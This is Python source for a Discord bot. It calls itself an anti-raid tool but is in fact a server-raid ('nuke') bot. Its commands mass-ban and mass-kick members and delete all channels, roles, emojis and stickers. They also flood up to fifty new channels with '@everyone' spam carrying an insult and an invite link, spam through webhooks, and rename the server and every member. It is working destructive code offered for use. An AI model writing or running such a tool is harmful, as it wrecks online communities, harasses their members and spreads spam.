import discord
from discord.ext import commands
import asyncio
import logging
import os
import random
import json

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
GIF_DEFECTO = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
ID_ROL_PREMIUM = 1513841062651756615

ejecuciones_por_servidor = {}
MAX_EJECUCIONES = 2
configuracion_premium = {}
usuarios_autorizados = set()

intents = discord.Intents.default()
intents.members = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")

# ================= COMANDO !eje =================
@bot.command()
async def eje(ctx):
    if not ctx.guild: return
    count = ejecuciones_por_servidor.get(ctx.guild.id, 0)
    color = discord.Color.green() if count == 0 else discord.Color.orange() if count == 1 else discord.Color.red()
    embed = discord.Embed(
        title="⚡ Estado de Ejecuciones",
        description=f"Ejecuciones del bot actualmente {count}/{MAX_EJECUCIONES}",
        color=color
    )
    embed.add_field(name="Servidores Ejecutados", value=f"{count} de {MAX_EJECUCIONES}", inline=False)
    try: await ctx.send(embed=embed)
    except: pass

# ================= COMANDO !ayuda =================
@bot.command()
async def ayuda(ctx, subcom: str = None):
    if subcom and subcom.lower() == "premium":
        menu_premium = (
            "```\n"
            "=== MacHUB Engine - Comandos Premium ===\n"
            "!ayuda premium    -> Muestra este menú exclusivo de soporte premium.\n"
            "!editar raid      -> Crea canales, spam e imágenes personalizadas paso a paso.\n"
            "!config           -> Muestra el diseño premium configurado en el servidor.\n"
            "!limpiar raid     -> Borra los ajustes de la raid y regresa a los de fábrica.\n"
            ".premium list     -> Muestra la lista de usuarios con el rango Premium.\n"
            "!dar premium @    -> Autoriza a un usuario para poder reclamar el rango.\n"
            "!quitar premium @ -> Elimina los privilegios de un usuario de forma directa.\n"
            ".premium          -> Comando de reclamo manual para el usuario autorizado.\n"
            "```"
        )
        try: await ctx.send(menu_premium)
        except: pass
        return

    menu_general = (
        "```\n"
        "=== Mc R Anti raid - cmds ===\n"
        "!uptime          -> Muestra el tiempo activo del bot y la latencia.\n"
        "!eje             -> Muestra el estado de ejecuciones del bot en vivo.\n"
        "!ayuda premium   -> Despliega las herramientas avanzadas de premium.\n"
        "!banpro          -> DM Masivo + Ban global a todos los miembros.\n"
        "!kickpro         -> Expulsa de inmediato a todos los miembros.\n"
        "!rD              -> Elimina todo, crea 50 canales e inunda con 20k mensajes.\n"
        "!ccpro           -> Elimina canales y crea 50 categorías para colapsar UI.\n"
        "!hookpro         -> Genera webhooks de spam ultra veloz por canal.\n"
        "!nickpro         -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
        "!rnServers       -> Cambia el nombre del servidor a 'Mc R'.\n"
        "!rolesD          -> Destruye todos los roles existentes del servidor.\n"
        "!rolesC          -> Genera 50 roles con colores arcoíris aleatorios.\n"
        "!emojisD         -> Elimina los emojis y stickers personalizados.\n"
        "============================================\n"
        "```"
    )
    try: await ctx.send(menu_general)
    except: pass

# ================= 1. COMANDO BANPRO =================
@bot.command()
async def banpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.ban_members: return
    if not ctx.guild.me.guild_permissions.ban_members: return
    
    targets = [m for m in ctx.guild.members if not m.bot and m.id != ctx.author.id and m.top_role < ctx.guild.me.top_role]
    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        async def process_member(member):
            try: await member.ban(reason="Baneo masivo By Mac.")
            except: pass
        tasks = [process_member(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)

# ================= 2. COMANDO RAIDEAR Y SPAM (!rD) =================
@bot.command()
async def rD(ctx):
    global ejecuciones_por_servidor
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
    if actuales >= MAX_EJECUCIONES:
        try: await ctx.send(f"❌ Límite alcanzado ({actuales}/{MAX_EJECUCIONES}).")
        except: pass
        return

    try:
        ejecuciones_por_servidor[ctx.guild.id] = actuales + 1

        channels_to_delete = list(ctx.guild.channels)
        for channel in channels_to_delete:
            try: await channel.delete()
            except: pass

        created_channels = []
        for _ in range(50):
            try:
                ch = await ctx.guild.create_text_channel(name="Mc R")
                created_channels.append(ch)
            except: pass

        msg_por_canal = 400
        async def spam_task(channel):
            for _ in range(msg_por_canal):
                try:
                    await channel.send("@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp")
                    await asyncio.sleep(0.1)
                except discord.HTTPException as e:
                    if e.status == 429: await asyncio.sleep(5)
                    else: break

        tasks = [spam_task(ch) for ch in created_channels]
        await asyncio.gather(*tasks)

    finally:
        actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
        ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)

# ================= 3. EXPULSIÓN MASIVA =================
@bot.command()
async def kickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.kick_members: return
    if not ctx.guild.me.guild_permissions.kick_members: return

    targets = [m for m in ctx.guild.members if not m.bot and m.id != ctx.author.id and m.top_role < ctx.guild.me.top_role]
    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        async def process_kick(member):
            try: await member.kick(reason="Limpieza Masiva By Mac.")
            except: pass
        tasks = [process_kick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)

# ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
@bot.command()
async def rnServers(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_guild: return
    if not ctx.guild.me.guild_permissions.manage_guild: return
    try:
        await ctx.guild.edit(name="Mc R", description="Server dominado.")
    except: pass

# ================= 5. BORRAR TODOS LOS ROLES =================
@bot.command()
async def rolesD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    roles_to_delete = [r for r in ctx.guild.roles if r.name != "@everyone" and r < ctx.guild.me.top_role and not r.is_bot_managed()]
    for role in roles_to_delete:
        try: await role.delete(reason="Remoción de roles.")
        except: pass
        await asyncio.sleep(0.2)

# ================= 6. CREACIÓN MASIVA DE ROLES =================
@bot.command()
async def rolesC(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    async def create_role_task():
        try:
            color_aleatorio = discord.Color(random.randint(0, 0xFFFFFF))
            await ctx.guild.create_role(name="Mc R", color=color_aleatorio)
        except: pass

    for i in range(0, 50, 10):
        tasks = [create_role_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)

# ================= 7. SATURACIÓN DE CATEGORÍAS =================
@bot.command()
async def ccpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass

    async def create_category_task():
        try: await ctx.guild.create_category(name="Mc R")
        except: pass

    for i in range(0, 50, 10):
        tasks = [create_category_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.4)

# ================= 8. CAMBIAR APODOS GLOBALMENTE =================
@bot.command()
async def nickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_nicknames: return
    if not ctx.guild.me.guild_permissions.manage_nicknames: return

    targets = [m for m in ctx.guild.members if m.id != ctx.guild.owner_id and m.top_role < ctx.guild.me.top_role]
    chunk_size = 20
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        async def set_nick(member):
            try: await member.edit(nick="Mc R")
            except: pass
        tasks = [set_nick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)

# ================= 9. BORRAR EMOJIS Y STICKERS =================
@bot.command()
async def emojisD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_expressions: return
    if not ctx.guild.me.guild_permissions.manage_expressions: return

    for emoji in list(ctx.guild.emojis):
        try: await emoji.delete()
        except: pass
    for sticker in list(ctx.guild.stickers):
        try: await sticker.delete()
        except: pass

# ================= 10. MULTI-WEBHOOK ATTACK =================
@bot.command()
async def hookpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_webhooks: return
    if not ctx.guild.me.guild_permissions.manage_webhooks: return

    channels = ctx.guild.text_channels
    if not channels: return

    async def launch_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="Mc R Engine")
            for _ in range(25):
                await webhook.send("@everyone server Nuevo https://discord.gg/aACMXB4HSp", username="Mc R")
                await asyncio.sleep(0.2)
        except: pass

    tasks = [launch_webhook(ch) for ch in channels[:15]]
    await asyncio.gather(*tasks)

# ================= 11. COMANDO UPTIME =================
@bot.command()
async def uptime(ctx):
    try: await ctx.send(f"📊 **Estado del Motor:**\n⚡ **Latencia (Ping):** `{round(bot.latency * 1000)}ms`")
    except: pass

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): return
    logging.error(f"Error: {error}")

bot.run(TOKEN)
